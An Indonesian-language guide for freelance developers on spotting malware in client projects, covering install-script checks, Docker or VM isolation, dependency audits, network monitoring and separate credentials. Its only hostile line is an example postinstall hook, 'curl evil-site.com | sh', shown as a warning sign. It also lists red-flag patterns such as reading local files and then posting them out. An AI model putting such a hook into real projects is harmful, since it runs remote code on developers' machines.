# Scam

Ketika masuk ke dunia freelancing, terdapat beberapa indikator dan jenis penipuan yang harus diwaspadai.

## Malware

Terutama untuk projek remote dan kita diminta menjalankan code client di laptop kita. Bagaimana kita mempersiapkan segala kemungkinan jelek yang mungkin terjadi.

### 1. Jangan langsung `npm install` / `composer install`

Ini yang paling sering kejadian.

Contoh di `package.json`:

```json
"scripts": {
  "postinstall": "curl evil-site.com | sh"
}
```

Kelihatan ekstrem, tapi script yang lebih subtle bisa aja.

Selalu cek dulu:

* `package.json`
* `composer.json`
* `Makefile`
* shell script (`.sh`)
* Dockerfile

Untuk Node:

```bash
npm install --ignore-scripts
```

Untuk yarn:

```bash
yarn install --ignore-scripts
```

Composer relatif lebih aman, tapi tetap cek bagian:

```json
"scripts"
```

di `composer.json`.

### 2. Jalankan di sandbox / environment terisolasi

Kalau project freelance, **jangan jalanin langsung di OS utama** kalau belum trust.

Pilihan praktis:

**Docker** (paling worth it buat web dev)

```bash
docker compose up
```

Atau buat compose reusable, copy ke tiap projek

```yml
services:
  app:
    image: php:8.3-fpm
    volumes:
      - .:/app  # Bind mount FS host ke Container
    working_dir: /app

  nginx:
    image: nginx
    ports:
      - "8080:80"
    volumes:
      - .:/app

  db:
    image: mysql:8
    environment:
      MYSQL_ROOT_PASSWORD: root
```

Dengan begini script jalan di container, bukan host.

Kalau lebih paranoid:

* VM pakai VirtualBox
* VMware Workstation
* Linux secondary user account

Kalau saya jadi freelancer fullstack, saya bakal punya satu environment disposable khusus “project random client”.

### 3. Review `.env.example` dan konfigurasi

Kadang bukan malware, tapi config ngawur.

Cek apakah ada:

* endpoint aneh
* webhook ke domain random
* external DB
* auto sync script
* telemetry custom

Misalnya:

```env
API_URL=https://something-weird.xyz
```

Periksa dulu.

---

### 4. Scan dependency

Node:

```bash
npm audit
```

atau pakai

Socket
via [Socket](https://socket.dev?utm_source=chatgpt.com)

Ini bagus buat detect package yang behavior-nya suspicious (akses filesystem/network saat install).

Untuk PHP:

```bash
composer audit
```

---

### 5. Buka dan baca entrypoint

Sebelum run:

* `index.js`
* `server.js`
* `artisan`
* bootstrap files
* startup shell scripts

Cari red flags:

```js
child_process.exec(...)
fs.readFile('/home/...')
axios.post(...)
```

Kalau ada kombinasi baca file lokal + kirim network, patut dicurigai.

---

### 6. Monitor network activity

Saat pertama run, lihat apakah app connect ke tempat aneh.

Di Windows:

* Resource Monitor
* TCPView dari [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/?utm_source=chatgpt.com)

Kalau tiba-tiba connect ke VPS random di negara antah berantah, ya itu bukan analytics biasa 😅

---

### 7. Pisahkan credential dev utama

Jangan expose:

* SSH key utama
* GitHub token utama
* production `.env`
* akses cloud utama

Buat akun/token khusus freelance project.

Ini penting. Banyak damage datang bukan dari malware canggih, tapi script baca:

```bash
~/.ssh
```

lalu upload.

---

### 8. Gunakan antivirus / endpoint protection aktif

Bukan solusi utama, tapi lapisan tambahan.

Kalau pakai Windows, Microsoft Defender sekarang sudah lumayan bagus.

---

### Workflow aman yang realistis buat kamu (Laravel / React dev)

Karena kamu sering pegang Laravel stack, flow aman:

1. clone repo
2. inspect `package.json`, `composer.json`
3. install pakai ignore scripts
4. run di Docker/Laragon isolated env
5. pakai dummy `.env`
6. monitor behavior
7. baru trust

Contoh:

```bash
git clone ...
cd project

npm install --ignore-scripts
composer install --no-scripts
```

Lalu review script manual sebelum:

```bash
npm run dev
php artisan serve
```

---

Kalau dapat project dari klien yang source-nya "nih mas langsung jalanin aja", anggap itu seperti orang bilang "tenang, anjingnya nggak gigit."

Mungkin benar. Tapi jangan tes pakai kaki sendiri.
